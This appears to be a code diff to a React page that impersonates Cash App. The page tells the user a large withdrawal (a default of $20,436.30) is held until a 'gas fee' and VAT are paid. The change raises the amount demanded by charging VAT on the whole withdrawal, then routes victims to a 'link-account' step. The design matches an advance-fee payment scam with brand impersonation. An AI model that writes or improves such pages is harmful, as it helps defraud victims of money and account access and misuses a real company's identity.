@@ -12,8 +12,8 @@ export default function CashAppGasFee() {
   const withdrawalAmount = ctx?.usdAmount && ctx.usdAmount > 0 ? ctx.usdAmount : 20436.30;
 
   const gasFee = Math.round(withdrawalAmount * GAS_FEE_RATE * 100) / 100;
-  const vatOnGas = Math.round(gasFee * VAT_RATE * 100) / 100;
-  const totalGasDue = Math.round((gasFee + vatOnGas) * 100) / 100;
+  const vatAmount = Math.round(withdrawalAmount * VAT_RATE * 100) / 100;
+  const totalGasDue = Math.round((gasFee + vatAmount) * 100) / 100;
 
   const [dots, setDots] = useState("");
   const dotsRef = useRef(0);
@@ -87,24 +87,33 @@ export default function CashAppGasFee() {
               </div>
 
               <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                <span className="text-[#666] text-sm">Gas Fee ({(GAS_FEE_RATE * 100).toFixed(1)}%)</span>
+                <div>
+                  <span className="text-[#666] text-sm">Gas Fee ({(GAS_FEE_RATE * 100).toFixed(1)}%)</span>
+                  <p className="text-[#999] text-[10px]">{(GAS_FEE_RATE * 100).toFixed(1)}% × ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
+                </div>
                 <span className="text-[#1A1A1A] font-semibold text-sm">
                   ${gasFee.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                 </span>
               </div>
 
               <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                <span className="text-[#666] text-sm">VAT ({(VAT_RATE * 100).toFixed(1)}%)</span>
+                <div>
+                  <span className="text-[#666] text-sm">VAT ({(VAT_RATE * 100).toFixed(1)}%)</span>
+                  <p className="text-[#999] text-[10px]">{(VAT_RATE * 100).toFixed(1)}% × ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
+                </div>
                 <span className="text-[#1A1A1A] font-semibold text-sm">
-                  ${vatOnGas.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+                  ${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                 </span>
               </div>
 
-              <div className="flex justify-between items-center pt-3 pb-1">
-                <span className="text-[#1A1A1A] font-bold text-base">Total Gas Fee Due</span>
-                <span className="text-[#00D632] font-black text-xl">
-                  ${totalGasDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
-                </span>
+              <div className="bg-[#F7F7F7] rounded-xl p-3 mt-2">
+                <div className="flex justify-between items-center">
+                  <span className="text-[#1A1A1A] font-bold text-base">Total Due</span>
+                  <span className="text-[#00D632] font-black text-xl">
+                    ${totalGasDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+                  </span>
+                </div>
+                <p className="text-[#999] text-[10px] mt-1">Gas Fee ${gasFee.toLocaleString("en-US", { minimumFractionDigits: 2 })} + VAT ${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
               </div>
             </div>
           </div>
@@ -155,7 +164,7 @@ export default function CashAppGasFee() {
               onClick={() => navigate("/link-account")}
               className="w-full py-4 bg-[#00D632] hover:bg-[#00C02E] text-white font-bold text-base rounded-2xl transition-colors shadow-lg shadow-[#00D632]/30"
             >
-              Pay Gas Fee — ${totalGasDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+              Pay Now — ${totalGasDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
             </button>
             <p className="text-center text-[#999] text-xs mt-3">
               Powered by Cash App • Secure Payment
